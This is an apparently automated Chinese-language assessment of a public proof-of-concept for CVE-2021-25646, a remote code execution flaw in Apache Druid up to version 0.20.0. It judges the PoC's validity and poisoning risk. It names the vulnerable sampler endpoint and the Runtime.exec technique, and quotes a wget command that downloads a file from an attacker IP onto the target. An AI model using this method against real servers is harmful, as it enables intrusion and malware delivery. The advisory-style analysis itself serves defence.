## CVE-2021-25646-Apache Druid-远程代码执行

**漏洞编号:** CVE-2021-25646

**漏洞类型:** 远程代码执行

**影响应用:** Apache Druid

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 0.20.0

**利用条件:** 需要目标Druid服务器版本低于或等于0.20.0，且攻击者需要具有经过身份验证的访问权限（根据漏洞库信息）。但根据部分搜索结果，某些默认配置可能无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-25646 漏洞允许经过身份验证的用户（或者在某些未授权配置下，未经身份验证的用户）通过发送特制的 HTTP 请求，在 Apache Druid 服务器上执行任意 JavaScript 代码，从而实现远程代码执行。  

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开的POC代码。提供的POC代码通过`POST /druid/indexer/v1/sampler?for=filter`发送包含恶意JavaScript代码的JSON数据，利用Druid的`filter`功能执行`wget`命令，下载恶意文件到`/tmp/hacked.txt`。因此，该POC代码是有效的。

**投毒风险分析：**
Payload.txt中的代码会尝试从攻击者的IP地址下载文件，存在潜在的投毒风险。攻击者可以替换文件内容，例如下载恶意的二进制文件或其他payload。README.md文件只是一个简单的说明，本身不包含恶意代码。

分析 Payload.txt 文件，其中的 JavaScript 代码旨在通过 `wget` 命令从 `IP/file` 下载文件到 `/tmp/hacked.txt`。这段代码本身不包含后门或者恶意逻辑，只是下载文件。但如果攻击者替换 `IP/file` 指向恶意文件，则可能造成投毒。

风险评估：
- **下载恶意文件:** 90% 的风险在于，攻击者可能会修改 `IP/file` 指向一个恶意的可执行文件、脚本或其他有害内容，导致受害者系统感染或被控制。
- **代码本身:** 代码本身（`wget IP/file -O /tmp/hacked.txt`）的恶意性只有 10%，因为这只是一个下载操作，恶意性取决于下载的内容。

**利用方式：**
1.  **身份验证：**  根据漏洞描述，默认需要首先通过Druid的身份验证机制。但是，需要注意的是，某些搜索结果表明，在某些默认配置下，Druid可能存在未授权访问的情况，无需身份验证即可利用此漏洞。
2.  **构造恶意请求：**  构造一个包含恶意JavaScript代码的JSON数据包，并将其发送到`/druid/indexer/v1/sampler?for=filter`端点。
3.  **代码执行：**  Druid服务器解析该请求，执行嵌入的JavaScript代码，从而实现远程代码执行。
4.  **利用 JavaScript 执行系统命令:** POC 利用 `java.lang.Runtime.getRuntime().exec()` 来执行系统命令 `wget IP/file -O /tmp/hacked.txt`。这里的核心是使用 Java 的 Runtime 对象来执行任意系统命令。

**总结：**
该漏洞利用方式简单，危害性高，利用代码有效，但存在一定的投毒风险，需要谨慎使用。

**项目地址:** [Vulnmachines/Apache-Druid-CVE-2021-25646](https://github.com/Vulnmachines/Apache-Druid-CVE-2021-25646)

**漏洞详情:** [CVE-2021-25646](https://nvd.nist.gov/vuln/detail/CVE-2021-25646)